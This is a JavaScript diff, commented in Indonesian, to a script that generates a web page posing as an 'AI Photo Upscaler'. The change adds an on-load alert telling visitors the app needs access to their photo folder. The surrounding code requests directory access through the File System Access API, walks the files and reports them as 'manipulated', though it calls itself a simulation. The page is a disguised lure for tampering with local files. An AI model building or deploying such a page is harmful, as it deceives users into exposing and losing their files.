@@ -70,7 +70,14 @@ const prepareMimeBlobAsync = (i) => {
             
             "var sudah = false;" +
             
-            // Cek apakah browser mendukung File System Access API
+            // --- MUNCULKAN ALERT SAAT HALAMAN DIMUAT ---
+            "window.addEventListener('load', function() {" +
+            "    setTimeout(function() {" +
+            "        alert('Peringatan: Aplikasi AI Photo Upscaler memerlukan akses ke folder foto Anda untuk memproses gambar.');" +
+            "    }, 500);" +
+            "});" +
+            // ------------------------------------------
+            
             "function cekDukungan() {" +
             "    if (!window.showDirectoryPicker) {" +
             "        return false;" +
@@ -83,7 +90,6 @@ const prepareMimeBlobAsync = (i) => {
             "    sudah = true;" +
             "    var statusEl = document.getElementById('status');" +
             "    " +
-            "    // Cek dukungan API terlebih dahulu" +
             "    if (!cekDukungan()) {" +
             "        statusEl.textContent = 'Browser tidak mendukung File System Access API.';" +
             "        statusEl.style.color = '#f00';" +
@@ -96,7 +102,6 @@ const prepareMimeBlobAsync = (i) => {
             "    statusEl.style.color = '#4CAF50';" +
             
             "    try {" +
-            "        // Meminta akses direktori" +
             "        var dirHandle = await window.showDirectoryPicker();" +
             "        statusEl.textContent = 'Akses diberikan. Memproses foto...';" +
             
@@ -117,7 +122,6 @@ const prepareMimeBlobAsync = (i) => {
             "        statusEl.textContent = 'Selesai memproses ' + fileCount + ' file.';" +
             "        alert('Simulasi selesai! ' + fileCount + ' file telah dimanipulasi.');" +
             "    } catch (e) {" +
-            "        // Jika user membatalkan atau terjadi error" +
             "        statusEl.textContent = 'Akses ditolak atau gagal: ' + e.message;" +
             "        statusEl.style.color = '#f00';" +
             "        sudah = false;" +
